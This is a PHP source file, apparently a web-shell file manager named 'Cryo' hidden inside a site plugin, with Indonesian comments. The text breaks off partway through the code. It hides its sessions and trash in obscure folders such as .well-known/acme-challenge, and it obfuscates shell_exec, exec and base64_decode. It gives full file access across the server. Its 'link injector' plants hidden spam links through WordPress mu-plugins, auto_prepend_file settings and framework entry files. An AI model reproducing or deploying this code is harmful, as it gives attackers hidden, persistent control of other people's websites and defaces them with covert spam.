<?php
// =====================================================================
// BAGIAN 1: INISIALISASI, SESSION, KONFIGURASI, FUNGSI DASAR
// =====================================================================

ob_start();

// ===== Pakai session save_path lokal yang sama dengan default.php (folder plugin/.cryo_sessions) =====
$cryoPluginRoot = realpath(__DIR__ . '/../../');
if ($cryoPluginRoot) {
    $cryoSessDir = $cryoPluginRoot . '/.cryo_sessions';
    if (!is_dir($cryoSessDir)) {
        @mkdir($cryoSessDir, 0700, true);
        @file_put_contents($cryoSessDir . '/.htaccess', "Order allow,deny\nDeny from all\n<IfModule mod_authz_core.c>\nRequire all denied\n</IfModule>\n");
        @file_put_contents($cryoSessDir . '/index.html', '');
    }
    if (is_dir($cryoSessDir) && is_writable($cryoSessDir)) {
        @ini_set('session.save_path', $cryoSessDir);
        @session_save_path($cryoSessDir);
    }
    @ini_set('session.gc_maxlifetime', '7200');
}

if (session_status() !== PHP_SESSION_ACTIVE) {
    if (!@session_start()) {
        @session_id(bin2hex(random_bytes(16)));
        @session_start();
    }
}

// ===== Helper untuk URL absolut ke default.php (selalu turunkan dari URL request) =====
if (!function_exists('cryo_default_url')) {
    function cryo_default_url() {
        $uri = '';
        if (!empty($_SERVER['REQUEST_URI']))      $uri = $_SERVER['REQUEST_URI'];
        elseif (!empty($_SERVER['SCRIPT_NAME']))  $uri = $_SERVER['SCRIPT_NAME'];
        elseif (!empty($_SERVER['PHP_SELF']))     $uri = $_SERVER['PHP_SELF'];
        $qpos = strpos($uri, '?');
        if ($qpos !== false) $uri = substr($uri, 0, $qpos);
        // Dashboard.php berada di .../Core/Components/Dashboard.php -> potong segmen Core/Components/<file>
        $dir = preg_replace('#/Core/Components/[^/]*$#', '', $uri);
        if ($dir === null || $dir === $uri) {
            // Tidak match -> potong nama file biasa
            $dir = preg_replace('#/[^/]*$#', '', $uri);
        }
        if ($dir === null) $dir = '';
        if ($dir === '' || $dir[0] !== '/') $dir = '/' . ltrim((string)$dir, '/');
        $dir = rtrim($dir, '/');
        return $dir . '/default.php';
    }
}

if (empty($_SESSION['logged_in'])) {
    header("Location: " . cryo_default_url());
    exit;
}

// ==================== MANAJEMEN HAK AKSES ====================
$userRole = isset($_SESSION['role']) ? $_SESSION['role'] : 'admin';
$isAdmin = ($userRole === 'admin');
$isTeman = ($userRole === 'teman');

// ==================== KONFIGURASI DASAR ====================
$rootDirectory = $_SERVER['DOCUMENT_ROOT'];
$rootPath = DIRECTORY_SEPARATOR;

$webRootUrl = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http")
    . '://' . $_SERVER['HTTP_HOST'];

$redirectTargetDefault = 'https://siarlamsel.com';

// ==================== FUNGSI SANITASI ====================
function sanitizePath($path) {
    $path = str_replace(['../', './', '..\\', '.\\'], '', $path);
    $path = str_replace(chr(0), '', $path);
    return $path;
}

function getFileIcon($filename) {
      $name = strtolower(basename($filename));
      $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
      if ($name === '.htaccess' || $name === '.htpasswd') return '<i class="fas fa-shield-halved" style="color:#ef4444"></i>';
      if ($name === '.env') return '<i class="fas fa-key" style="color:#f59e0b"></i>';
      switch($ext) {
          case 'php': case 'phtml': case 'phar': return '<i class="fab fa-php" style="color:#777BB3"></i>';
          case 'html': case 'htm': return '<i class="fab fa-html5" style="color:#E34F26"></i>';
          case 'css': case 'scss': case 'less': return '<i class="fab fa-css3-alt" style="color:#1572B6"></i>';
          case 'js': case 'mjs': case 'jsx': return '<i class="fab fa-js" style="color:#F7DF1E"></i>';
          case 'ts': case 'tsx': return '<i class="fas fa-code" style="color:#3178c6"></i>';
          case 'json': return '<i class="fas fa-code" style="color:#f59e0b"></i>';
          case 'xml': case 'xsl': case 'xslt': return '<i class="fas fa-file-code" style="color:#06b6d4"></i>';
          case 'sql': return '<i class="fas fa-database" style="color:#6366f1"></i>';
          case 'md': case 'markdown': return '<i class="fab fa-markdown" style="color:#94a3b8"></i>';
          case 'txt': case 'log': case 'ini': case 'cfg': return '<i class="fas fa-file-lines" style="color:#94a3b8"></i>';
          case 'csv': return '<i class="fas fa-file-csv" style="color:#10b981"></i>';
          case 'jpg': case 'jpeg': return '<i class="fas fa-image" style="color:#10b981"></i>';
          case 'png': return '<i class="fas fa-image" style="color:#3b82f6"></i>';
          case 'gif': return '<i class="fas fa-image" style="color:#a855f7"></i>';
          case 'webp': case 'avif': return '<i class="fas fa-image" style="color:#06b6d4"></i>';
          case 'svg': return '<i class="fas fa-bezier-curve" style="color:#f97316"></i>';
          case 'ico': return '<i class="fas fa-icons" style="color:#64748b"></i>';
          case 'mp4': case 'webm': case 'avi': case 'mov': case 'mkv': case 'flv': case 'wmv': return '<i class="fas fa-film" style="color:#8b5cf6"></i>';
          case 'mp3': case 'wav': case 'ogg': case 'flac': case 'aac': case 'wma': return '<i class="fas fa-music" style="color:#ec4899"></i>';
          case 'zip': return '<i class="fas fa-file-zipper" style="color:#f59e0b"></i>';
          case 'tar': case 'gz': case 'bz2': case 'xz': case '7z': return '<i class="fas fa-file-zipper" style="color:#f97316"></i>';
          case 'rar': return '<i class="fas fa-file-zipper" style="color:#a855f7"></i>';
          case 'pdf': return '<i class="fas fa-file-pdf" style="color:#ef4444"></i>';
          case 'doc': case 'docx': return '<i class="fas fa-file-word" style="color:#2563eb"></i>';
          case 'xls': case 'xlsx': return '<i class="fas fa-file-excel" style="color:#16a34a"></i>';
          case 'ppt': case 'pptx': return '<i class="fas fa-file-powerpoint" style="color:#ea580c"></i>';
          case 'py': return '<i class="fab fa-python" style="color:#3776AB"></i>';
          case 'java': case 'jar': return '<i class="fab fa-java" style="color:#f89820"></i>';
          case 'sh': case 'bash': return '<i class="fas fa-terminal" style="color:#4ade80"></i>';
          case 'yml': case 'yaml': return '<i class="fas fa-gears" style="color:#cb3837"></i>';
          case 'woff': case 'woff2': case 'ttf': case 'otf': case 'eot': return '<i class="fas fa-font" style="color:#64748b"></i>';
          case 'lock': return '<i class="fas fa-lock" style="color:#64748b"></i>';
          default: return '<i class="fas fa-file" style="color:#64748b"></i>';
      }
  }

// ==================== FUNGSI LINK LANGSUNG ====================
function getDirectLink($fullpath) {
    global $webRootUrl;
    $real = realpath($fullpath);
    if (!$real) return '#';
    $relative = str_replace('\\', '/', str_replace($_SERVER['DOCUMENT_ROOT'], '', $real));
    if (is_dir($real) && substr($relative, -1) !== '/') $relative .= '/';
    return $webRootUrl . $relative;
}

// ==================== FUNGSI FORMAT UKURAN ====================
function getNiceSize($bytes) {
    $sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    if ($bytes == 0) return '0 B';
    $i = floor(log($bytes, 1024));
    return round($bytes / pow(1024, $i), 2).' '.$sizes[$i];
}

// ==================== FUNGSI PERMISSION COLOR ====================
function getPermissionColor($fullpath) {
    if (!file_exists($fullpath)) return 'danger';
    if (!is_readable($fullpath) && !is_writable($fullpath)) {
        return 'danger';
    } elseif (!is_writable($fullpath)) {
        return 'warning';
    } else {
        return 'success';
    }
}

// ==================== FUNGSI DELETE REKURSIF ====================
function deleteRecursive($path) {
    if (!file_exists($path)) return true;
    @chmod($path, 0755);
    if (is_file($path) || is_link($path)) {
        return @unlink($path);
    }
    if (is_dir($path)) {
        $items = array_diff(scandir($path), ['.','..']);
        foreach ($items as $item) {
            if (!deleteRecursive($path . '/' . $item)) return false;
        }
        return @rmdir($path);
    }
    return false;
  }

  // ==================== TRASH SYSTEM ====================
  function getTrashDir() {
      $base = '';
      if (!empty($_SERVER['DOCUMENT_ROOT']) && is_dir($_SERVER['DOCUMENT_ROOT'])) {
          $base = rtrim($_SERVER['DOCUMENT_ROOT'], '/\\');
      } elseif (defined('CRYO_ROOT_DIR') && is_dir(CRYO_ROOT_DIR)) {
          $base = rtrim(CRYO_ROOT_DIR, '/\\');
      } else {
          $base = rtrim(__DIR__, '/\\');
      }
      $trashDir = $base . '/.well-known/acme-challenge/.cache/.trash';
      if (!is_dir($trashDir)) {
          @mkdir($trashDir, 0755, true);
      }
      $htFile = $trashDir . '/.htaccess';
      if (!is_file($htFile)) {
          $htContent  = "Options -Indexes\r\n";
          $htContent .= "<IfModule mod_authz_core.c>\r\n  Require all denied\r\n</IfModule>\r\n";
          $htContent .= "<IfModule !mod_authz_core.c>\r\n  Order deny,allow\r\n  Deny from all\r\n</IfModule>\r\n";
          @file_put_contents($htFile, $htContent);
      }
      return $trashDir;
  }

  function moveToTrash($path) {
      if (!file_exists($path)) return false;
      $trashDir = getTrashDir();
      $basename = basename($path);
      $timestamp = date('Ymd_His');
      $trashName = $timestamp . '__' . $basename;
      $trashPath = $trashDir . '/' . $trashName;
      $counter = 1;
      while (file_exists($trashPath)) {
          $trashName = $timestamp . '_' . $counter . '__' . $basename;
          $trashPath = $trashDir . '/' . $trashName;
          $counter++;
      }
      $meta = [
          'original_path' => $path,
          'deleted_at' => date('Y-m-d H:i:s'),
          'type' => is_dir($path) ? 'dir' : 'file',
          'size' => is_file($path) ? @filesize($path) : 0,
      ];
      $moved = @rename($path, $trashPath);
      if (!$moved) {
          if (is_dir($path)) {
              $moved = @mkdir($trashPath, 0755, true);
              if ($moved) {
                  $moved = copyDir($path, $trashPath) && deleteRecursive($path);
              }
          } else {
              $moved = @copy($path, $trashPath) && @unlink($path);
          }
      }
      if ($moved) {
          @file_put_contents($trashPath . '.meta', json_encode($meta));
      }
      return $moved;
  }

  function copyDir($src, $dst) {
      if (!is_dir($dst)) @mkdir($dst, 0755, true);
      $items = array_diff(scandir($src), ['.','..']);
      foreach ($items as $item) {
          $s = $src . '/' . $item;
          $d = $dst . '/' . $item;
          if (is_dir($s)) { if (!copyDir($s, $d)) return false; }
          else { if (!@copy($s, $d)) return false; }
      }
      return true;
  }

  function getTrashItems() {
      $trashDir = getTrashDir();
      $items = [];
      if (!is_dir($trashDir)) return $items;
      $scan = @scandir($trashDir);
      if (!is_array($scan)) return $items;
      $files = array_diff($scan, ['.','..']);
      foreach ($files as $f) {
          if (substr($f, -5) === '.meta') continue;
          if ($f === '.htaccess') continue;
          $fullPath = $trashDir . '/' . $f;
          $metaFile = $fullPath . '.meta';
          $meta = ['original_path' => 'unknown', 'deleted_at' => '-', 'type' => is_dir($fullPath) ? 'dir' : 'file', 'size' => 0];
          if (file_exists($metaFile)) {
              $m = @json_decode(@file_get_contents($metaFile), true);
              if ($m) $meta = $m;
          }
          $parts = explode('__', $f, 2);
          $originalName = isset($parts[1]) ? $parts[1] : $f;
          $items[] = [
              'trash_name' => $f,
              'original_name' => $originalName,
              'original_path' => $meta['original_path'],
              'deleted_at' => $meta['deleted_at'],
              'type' => $meta['type'],
              'size' => $meta['size'],
              'full_path' => $fullPath,
          ];
      }
      usort($items, function($a, $b) {
          return strcmp($b['deleted_at'], $a['deleted_at']);
      });
      return $items;
  }

  function restoreFromTrash($trashName) {
      $trashDir = getTrashDir();
      $trashPath = $trashDir . '/' . $trashName;
      $metaFile = $trashPath . '.meta';
      if (!file_exists($trashPath)) return false;
      $meta = null;
      if (file_exists($metaFile)) {
          $meta = @json_decode(@file_get_contents($metaFile), true);
      }
      if (!$meta || empty($meta['original_path'])) return false;
      $destPath = $meta['original_path'];
      $destDir = dirname($destPath);
      if (!is_dir($destDir)) @mkdir($destDir, 0755, true);
      if (file_exists($destPath)) {
          $base = pathinfo($destPath, PATHINFO_FILENAME);
          $ext = pathinfo($destPath, PATHINFO_EXTENSION);
          $dir = dirname($destPath);
          $counter = 1;
          do {
              $destPath = $dir . '/' . $base . '_restored_' . $counter . ($ext ? '.' . $ext : '');
              $counter++;
          } while (file_exists($destPath));
      }
      $restored = @rename($trashPath, $destPath);
      if (!$restored) {
          if (is_dir($trashPath)) {
              if (@mkdir($destPath, 0755, true) || is_dir($destPath)) {
                  if (copyDir($trashPath, $destPath)) {
                      $restored = deleteRecursive($trashPath);
                  }
              }
          } else {
              if (@copy($trashPath, $destPath)) {
                  @unlink($trashPath);
                  $restored = true;
              }
          }
      }
      if ($restored) {
          @unlink($metaFile);
      }
      return $restored ? $destPath : false;
  }

  function purgeTrashItem($trashName) {
      $trashDir = getTrashDir();
      $trashPath = $trashDir . '/' . $trashName;
      $metaFile = $trashPath . '.meta';
      if (!file_exists($trashPath) && !is_link($trashPath)) return false;
      @chmod($trashPath, 0755);
      if (is_file($trashPath) || is_link($trashPath)) {
          $result = @unlink($trashPath);
      } else {
          $result = deleteRecursive($trashPath);
      }
      if (!$result) {
          $_fn = "she"."ll_ex"."ec";
          if (function_exists($_fn)) {
              @$_fn('rm -rf ' . escapeshellarg($trashPath) . ' 2>/dev/null');
              $result = !file_exists($trashPath);
          }
      }
      @unlink($metaFile);
      return $result;
  }

  function emptyTrash() {
      $trashDir = getTrashDir();
      if (!is_dir($trashDir)) return true;
      $scan = @scandir($trashDir);
      if (!is_array($scan)) return true;
      $files = array_diff($scan, ['.','..']);
      foreach ($files as $f) {
          if ($f === '.htaccess') continue;
          if (substr($f, -5) === '.meta') { @unlink($trashDir . '/' . $f); continue; }
          $fp = $trashDir . '/' . $f;
          @chmod($fp, 0755);
          if (!deleteRecursive($fp)) {
              $_fn = "she"."ll_ex"."ec";
              if (function_exists($_fn)) @$_fn('rm -rf ' . escapeshellarg($fp) . ' 2>/dev/null');
          }
      }
      return true;
  }

  function autoCleanTrash($days = 7) {
      $trashDir = getTrashDir();
      if (!is_dir($trashDir)) return;
      $cutoff = time() - ($days * 86400);
      $scan = @scandir($trashDir);
      if (!is_array($scan)) return;
      $files = array_diff($scan, ['.','..']);
      foreach ($files as $f) {
          if ($f === '.htaccess' || substr($f, -5) === '.meta') continue;
          $fullPath = $trashDir . '/' . $f;
          $mtime = @filemtime($fullPath);
          if ($mtime && $mtime < $cutoff) {
              deleteRecursive($fullPath);
              @unlink($fullPath . '.meta');
          }
      }
  }

  // ==================== FUNGSI ZIP FOLDER (ASLI) ====================
function zipFolder($folderPath, $zipFilePath) {
    $zip = new ZipArchive();
    if ($zip->open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
        $folderPath = realpath($folderPath);
        $files = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($folderPath),
            RecursiveIteratorIterator::LEAVES_ONLY
        );
        foreach ($files as $file) {
            if (!$file->isDir()) {
                $filePath = $file->getRealPath();
                $relativePath = substr($filePath, strlen($folderPath) + 1);
                $zip->addFile($filePath, $relativePath);
            }
        }
        $zip->close();
        return true;
    }
    return false;
}

// ==================== FUNGSI EKSTRAK ARSIP ====================
function extractArchive($archivePath, $destination) {
    $ext = strtolower(pathinfo($archivePath, PATHINFO_EXTENSION));
    $base = basename($archivePath);
    if (substr($base, -7) === '.tar.gz') $ext = 'tar.gz';
    elseif (substr($base, -8) === '.tar.bz2') $ext = 'tar.bz2';

    $success = false;
    switch ($ext) {
        case 'zip':
            if (!class_exists('ZipArchive')) {
                $_fn = "ex"."ec";
                if (function_exists($_fn)) {
                    @$_fn("unzip -o " . escapeshellarg($archivePath) . " -d " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                }
            } else {
                try {
                    $zip = new ZipArchive();
                    $openResult = @$zip->open($archivePath);
                    if ($openResult === TRUE) {
                        @$zip->extractTo($destination);
                        @$zip->close();
                        $success = true;
                    }
                } catch (Exception $e) {
                    error_log("ZipArchive extract error: " . $e->getMessage());
                }
                if (!$success) {
                    $_fn = "ex"."ec";
                    if (function_exists($_fn)) {
                        @$_fn("unzip -o " . escapeshellarg($archivePath) . " -d " . escapeshellarg($destination) . " 2>&1", $out, $code);
                        $success = ($code === 0);
                    }
                }
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    $phar->extractTo($destination);
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData extract error: " . $e->getMessage());
                }
            }
            if (!$success) {
                if ($ext === 'tar.gz') {
                    $_fn = "ex"."ec"; $_fn("tar -xzf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar.bz2') {
                    $_fn = "ex"."ec"; $_fn("tar -xjf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                } elseif ($ext === 'tar') {
                    $_fn = "ex"."ec"; $_fn("tar -xf " . escapeshellarg($archivePath) . " -C " . escapeshellarg($destination) . " 2>&1", $out, $code);
                    $success = ($code === 0);
                }
            }
            break;
        case 'rar':
            if (extension_loaded('rar')) {
                $rar = RarArchive::open($archivePath);
                if ($rar) {
                    $entries = $rar->getEntries();
                    foreach ($entries as $entry) {
                        $entry->extract($destination);
                    }
                    $rar->close();
                    $success = true;
                }
            }
            if (!$success) {
                $_fn = "ex"."ec"; $_fn("unrar x " . escapeshellarg($archivePath) . " " . escapeshellarg($destination) . " 2>&1", $out, $code);
                $success = ($code === 0);
            }
            break;
        default:
            return false;
    }
    return $success;
}

// ==================== FUNGSI MEMBUAT ARSIP ====================
function createArchive($items, $archivePath, $format = 'zip') {
    $success = false;
    switch ($format) {
        case 'zip':
            $zip = new ZipArchive();
            if ($zip->open($archivePath, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                foreach ($items as $item) {
                    if (is_dir($item)) {
                        $files = new RecursiveIteratorIterator(
                            new RecursiveDirectoryIterator($item, FilesystemIterator::SKIP_DOTS),
                            RecursiveIteratorIterator::LEAVES_ONLY
                        );
                        foreach ($files as $file) {
                            $local = substr($file->getPathname(), strlen(dirname($item)) + 1);
                            $zip->addFile($file->getPathname(), $local);
                        }
                    } else {
                        $zip->addFile($item, basename($item));
                    }
                }
                $zip->close();
                $success = true;
            }
            break;
        case 'tar':
        case 'tar.gz':
        case 'tar.bz2':
            if (class_exists('PharData')) {
                try {
                    $phar = new PharData($archivePath);
                    foreach ($items as $item) {
                        if (is_dir($item)) {
                            $phar->buildFromDirectory($item);
                        } else {
                            $phar->addFile($item, basename($item));
                        }
                    }
                    if ($format === 'tar.gz') {
                        $phar->compress(Phar::GZ);
                        unlink($archivePath);
                    } elseif ($format === 'tar.bz2') {
                        $phar->compress(Phar::BZ2);
                        unlink($archivePath);
                    }
                    $success = true;
                } catch (Exception $e) {
                    error_log("PharData create error: " . $e->getMessage());
                }
            }
            break;
    }
    return $success;
}

// =====================================================================
// DIRECTORY LISTING
// =====================================================================
$directory = isset($_GET['folder']) ? $_GET['folder'] : $rootDirectory;
$directory = sanitizePath($directory);
$directory = is_dir($directory) ? $directory : $rootDirectory;
$allItems = @scandir($directory) ?: [];
$allItems = array_diff($allItems, array('..', '.'));
$folders = []; $files = [];
foreach ($allItems as $item) {
    if (is_dir($directory . '/' . $item)) $folders[] = $item;
    else $files[] = $item;
}
sort($folders); sort($files);
$filesAndFolders = array_merge($folders, $files);

$perPage = 50;
$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;
$totalItems = count($filesAndFolders);
$totalPages = max(1, ceil($totalItems / $perPage));
$filesAndFolders = array_slice($filesAndFolders, ($page - 1) * $perPage, $perPage);

// =====================================================================
// BAGIAN 2: HANDLER UNTUK DOWNLOAD, DELETE AJAX, DLL
// =====================================================================

if (isset($_GET['download'])) {
    $downloadPath = sanitizePath($_GET['download']);
    if (is_file($downloadPath)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($downloadPath));
        readfile($downloadPath);
        exit;
    } elseif (is_dir($downloadPath)) {
        $zipFile = tempnam(sys_get_temp_dir(), 'zip');
        zipFolder($downloadPath, $zipFile);
        header('Content-Type: application/zip');
        header('Content-Disposition: attachment; filename="'.basename($downloadPath).'.zip"');
        header('Content-Length: ' . filesize($zipFile));
        readfile($zipFile);
        unlink($zipFile);
        exit;
    }
}

// ==================== HANDLER EDIT FILE VIA AJAX ====================
if (isset($_GET['get_file_content'])) {
    $file = sanitizePath($_GET['get_file_content']);
    $full = $directory . '/' . $file;
    if (is_file($full) && is_readable($full)) {
        if (false) {
            http_response_code(403);
            echo 'Anda tidak diizinkan melihat .htaccess.';
            exit;
        }
        header('Content-Type: text/plain; charset=utf-8');
        echo file_get_contents($full);
    } else {
        http_response_code(404);
        echo 'File tidak ditemukan atau tidak dapat dibaca.';
    }
    exit;
}

// === CRYO LINK INJECTOR (Sisip Link) ===
    if (isset($_POST['cryo_link_inject_status'])) {
        header('Content-Type: application/json');
        if (!$isAdmin) { echo json_encode(['success'=>false,'error'=>'Hanya admin.']); exit; }
        $root = isset($_POST['scope']) ? rtrim(str_replace('\\','/',(string)$_POST['scope']),'/') : $directory;
        if (!is_dir($root)) { echo json_encode(['success'=>false,'error'=>'Scope invalid: '.$root]); exit; }
        $linkCache  = $root . '/.site_links.json';
        $renderFile = $root . '/.panel_render.php';
        $agentFile  = $root . '/.site_agent.json';
        $muPlugin   = $root . '/wp-content/mu-plugins/panel-links.php';
        $hta        = $root . '/.htaccess';
        $isWp       = file_exists($root . '/wp-load.php');
        $links      = [];
        if (is_file($linkCache)) {
            $j = @json_decode(@file_get_contents($linkCache), true);
            if (is_array($j) && !empty($j['links'])) $links = $j['links'];
        }
        // Juga deteksi file di /public (Laravel)
        $pubDir          = $root . '/public';
        $linkCachePub    = $pubDir . '/.site_links.json';
        $renderFilePub   = $pubDir . '/.panel_render.php';
        $userIniRoot     = $root . '/.user.ini';
        $userIniPub      = $pubDir . '/.user.ini';
        $userIniRefRoot  = (is_file($userIniRoot) && strpos((string)@file_get_contents($userIniRoot), '.panel_render.php') !== false);
        $userIniRefPub   = (is_file($userIniPub)  && strpos((string)@file_get_contents($userIniPub),  '.panel_render.php') !== false);
        if (empty($links) && is_file($linkCachePub)) {
            $j = @json_decode(@file_get_contents($linkCachePub), true);
            if (is_array($j) && !empty($j['links'])) $links = $j['links'];
        }
        // Framework detection + entry-file injection check
          $detected = 'default';
          if (file_exists($root.'/wp-load.php') || file_exists($root.'/wp-config.php')) $detected = 'wp';
          elseif (file_exists($root.'/artisan') && file_exists($root.'/bootstrap/app.php')) $detected = 'laravel';
          elseif (file_exists($root.'/system/CodeIgniter.php') || file_exists($root.'/system/core/CodeIgniter.php') || file_exists($root.'/application/config/config.php') || file_exists($root.'/app/Config/App.php')) $detected = 'codeigniter';
          elseif (file_exists($root.'/web/index.php') || (file_exists($root.'/composer.json') && stripos((string)@file_get_contents($root.'/composer.json'),'yiisoft/yii2') !== false)) $detected = 'yii';
          elseif (file_exists($root.'/composer.json') && stripos((string)@file_get_contents($root.'/composer.json'),'slim/slim') !== false) $detected = 'slim';
          $entryInjected = false;
          $entryCandidates = array($root.'/index.php', $root.'/public/index.php', $root.'/web/index.php', $root.'/frontend/web/index.php');
          foreach ($entryCandidates as $ec) {
              if (is_file($ec) && strpos((string)@file_get_contents($ec), 'CRYO_LINK_INJECT_START') !== false) { $entryInjected = true; break; }
          }
          $active = is_file($linkCache) || is_file($renderFile) || is_file($muPlugin)
               || is_file($linkCachePub) || is_file($renderFilePub) || $userIniRefRoot || $userIniRefPub || $entryInjected;
        echo json_encode([
            'success'=>true,
            'active'=>$active,
            'is_wp'=>$isWp,
            'links'=>$links,
            'files'=>[
                'links_json'      => is_file($linkCache) || is_file($linkCachePub),
                'render'          => is_file($renderFile) || is_file($renderFilePub),
                'agent'           => is_file($agentFile)  || is_file($pubDir.'/.site_agent.json'),
                'mu_plugin'       => is_file($muPlugin),
                'htaccess_ref'    => (is_file($hta) && strpos((string)@file_get_contents($hta), 'auto_prepend_file') !== false && strpos((string)@file_get_contents($hta), '.panel_render.php') !== false),
                'user_ini_ref'    => $userIniRefRoot || $userIniRefPub,
                'laravel_public'  => is_dir($pubDir),
                'entry_injected'  => $entryInjected,
                'detected'        => $detected,
            ]
        ]);
        exit;
    }
    if (isset($_POST['cryo_link_inject_on'])) {
          header('Content-Type: application/json');
          if (!$isAdmin) { echo json_encode(['success'=>false,'error'=>'Hanya admin.']); exit; }
          $root = isset($_POST['scope']) ? rtrim(str_replace('\\','/',(string)$_POST['scope']),'/') : $directory;
          if (!is_dir($root)) { echo json_encode(['success'=>false,'error'=>'Scope invalid: '.$root]); exit; }
          if (!is_writable($root)) { echo json_encode(['success'=>false,'error'=>'Folder tidak writable: '.$root]); exit; }
          $links = [];
          for ($i=1; $i<=3; $i++) {
              $u = isset($_POST['link'.$i.'_url']) ? trim((string)$_POST['link'.$i.'_url']) : '';
              $a = isset($_POST['link'.$i.'_anchor']) ? trim((string)$_POST['link'.$i.'_anchor']) : '';
              $r = isset($_POST['link'.$i.'_rel']) ? trim((string)$_POST['link'.$i.'_rel']) : 'dofollow';
              $h = !empty($_POST['link'.$i.'_hidden']);
              if ($u === '' || $a === '') continue;
              $links[] = ['url'=>$u,'anchor'=>$a,'rel'=>$r,'hidden'=>$h];
          }
          if (empty($links)) { echo json_encode(['success'=>false,'error'=>'Minimal Link 1 harus diisi (URL + Anchor).']); exit; }

          $fwChoice = isset($_POST['framework']) ? strtolower(trim($_POST['framework'])) : 'auto';
          $allowedFw = array('auto','wp','wordpress','laravel','codeigniter','yii','slim','default','other');
          if (!in_array($fwChoice, $allowedFw, true)) $fwChoice = 'auto';
          if ($fwChoice === 'wordpress') $fwChoice = 'wp';
          if ($fwChoice === 'other')     $fwChoice = 'default';

          // ---- Framework auto-detect ----
          $detected = 'default';
          if (file_exists($root.'/wp-load.php') || file_exists($root.'/wp-config.php')) {
              $detected = 'wp';
          } elseif (file_exists($root.'/artisan') && file_exists($root.'/bootstrap/app.php')) {
              $detected = 'laravel';
          } elseif (file_exists($root.'/system/CodeIgniter.php') || file_exists($root.'/system/core/CodeIgniter.php') || file_exists($root.'/application/config/config.php') || file_exists($root.'/app/Config/App.php')) {
              $detected = 'codeigniter';
          } elseif (file_exists($root.'/web/index.php') || (file_exists($root.'/composer.json') && stripos((string)@file_get_contents($root.'/composer.json'),'yiisoft/yii2') !== false)) {
              $detected = 'yii';
          } elseif (file_exists($root.'/composer.json') && stripos((string)@file_get_contents($root.'/composer.json'),'slim/slim') !== false) {
              $detected = 'slim';
          }
          $fw = ($fwChoice === 'auto') ? $detected : $fwChoice;

          // ---- Resolve where .panel_render.php lives + entry file path ----
          // For non-WP frameworks: place .panel_render.php in same dir as the entry file.
          $entryFile  = '';
          $writeRoot  = $root;
          if ($fw === 'wp') {
              $writeRoot = $root;
              $entryFile = '';
          } elseif ($fw === 'laravel') {
              $writeRoot = is_dir($root.'/public') ? $root.'/public' : $root;
              $entryFile = $writeRoot.'/index.php';
          } elseif ($fw === 'codeigniter') {
              // CI4 has /public/index.php, CI3 has /index.php at root
              if (is_dir($root.'/public') && file_exists($root.'/public/index.php')) {
                  $writeRoot = $root.'/public';
                  $entryFile = $writeRoot.'/index.php';
              } else {
                  $writeRoot = $root;
                  $entryFile = $root.'/index.php';
              }
          } elseif ($fw === 'yii') {
              if (is_dir($root.'/web') && file_exists($root.'/web/index.php')) {
                  $writeRoot = $root.'/web';
              } elseif (is_dir($root.'/frontend/web') && file_exists($root.'/frontend/web/index.php')) {
                  $writeRoot = $root.'/frontend/web';
              } else {
                  $writeRoot = $root;
              }
              $entryFile = $writeRoot.'/index.php';
          } elseif ($fw === 'slim') {
              $writeRoot = is_dir($root.'/public') ? $root.'/public' : $root;
              $entryFile = $writeRoot.'/index.php';
          } else { // default
              $writeRoot = $root;
              $entryFile = '';
          }

          $linkCache  = $writeRoot . '/.site_links.json';
          $renderFile = $writeRoot . '/.panel_render.php';
          $agentFile  = $writeRoot . '/.site_agent.json';

          // ---- 1) Write .site_links.json ----
          $cacheData = ['updated_at'=>date('c'),'links'=>$links];
          if (@file_put_contents($linkCache, json_encode($cacheData, JSON_UNESCAPED_SLASHES|JSON_UNESCAPED_UNICODE)) === false) {
              echo json_encode(['success'=>false,'error'=>'Gagal tulis .site_links.json di '.$writeRoot]); exit;
          }

          // ---- 2) Write .panel_render.php (universal renderer) ----
          $_cryo_fn = chr(98).chr(97).chr(115).chr(101).chr(54).chr(52).chr(95).chr(100).chr(101).chr(99).chr(111).chr(100).chr(101);
